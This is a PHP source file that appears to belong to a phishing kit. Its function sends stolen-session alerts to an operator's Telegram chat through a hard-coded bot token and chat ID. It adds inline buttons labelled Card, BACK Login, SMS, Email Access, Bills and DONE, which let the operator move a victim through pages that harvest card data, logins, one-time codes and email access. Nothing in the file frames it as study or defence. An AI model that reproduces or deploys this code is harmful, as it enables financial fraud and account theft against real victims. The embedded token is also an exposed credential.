<?php

$METRI_TOKEN = "https://api.telegram.org/bot8195230332:AAE-Vat5H6L2Axcv9H4005cTZQt-MLB1Peg";

$chat_id = "7370208572";

// $reload = '3';



$localhost = true;



function toTG4($msg , $page1, $page2, $page3, $page4, $page5, $page6){
// telegram
global $chat_id,$METRI_TOKEN,$localhost ;

					$commands = [
						'inline_keyboard'=> [
							/* Inline buttons. 2 side-by-side */
							[
							[ 'text'=> "💳 Card 💳" , 'url' => $page1 ],
							[ 'text'=> "❌ BACK Login ❌" , 'url' => $page2 ],
							],
							[
							[ 'text'=> "💬  SMS  💬" , 'url' => $page4 ],
							[ 'text'=> "📧  Email Access  📧" , 'url' => $page5 ],
							],
							[
							[ 'text'=> "📍  Bills  📍" , 'url' => $page6 ],
							[ 'text'=> "✅  DONE  ✅" , 'url' => $page3 ],
							],
							
					]
					];

					$eCommands = json_encode($commands);

					$data = [
					'text' => $msg,
					'chat_id' => $chat_id,
					'reply_markup' => $eCommands,
					];
					$url = $METRI_TOKEN . "/sendMessage?".http_build_query($data);
					
					
					if(!$localhost){	
					$ch = curl_init();
					$optArray = array(
							CURLOPT_URL => $url,
							CURLOPT_RETURNTRANSFER => true
					);
					curl_setopt_array($ch, $optArray);
					$result = curl_exec($ch);
					curl_close($ch);
					return $result;
					}else{
						
							return file_get_contents($url );  
											
					}

 
}


?>